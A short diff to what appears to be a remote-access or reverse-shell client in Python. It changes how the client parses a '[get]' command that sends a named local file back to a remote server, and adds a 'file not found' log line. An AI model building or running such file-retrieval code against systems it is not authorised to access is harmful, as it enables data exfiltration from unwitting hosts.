@@ -304,10 +304,12 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         elif "[get]" in data:  #find file locally then push to remote server
             if VERBOSE:
                 print_info("Received GET")
-            file_name = data.split()[1]
+            file_name = data.split()[1].strip("[END]")
             if path.exists(file_name):
                 file_transfer_get(conn, file_name)
             else:
+                if VERBOSE:
+                    print_info("File not Found --> {}".format(file_name))
                 send_data(conn, "####FILE_#NOT#_FOUND####")
             data = ""
         elif "[put]" in data:
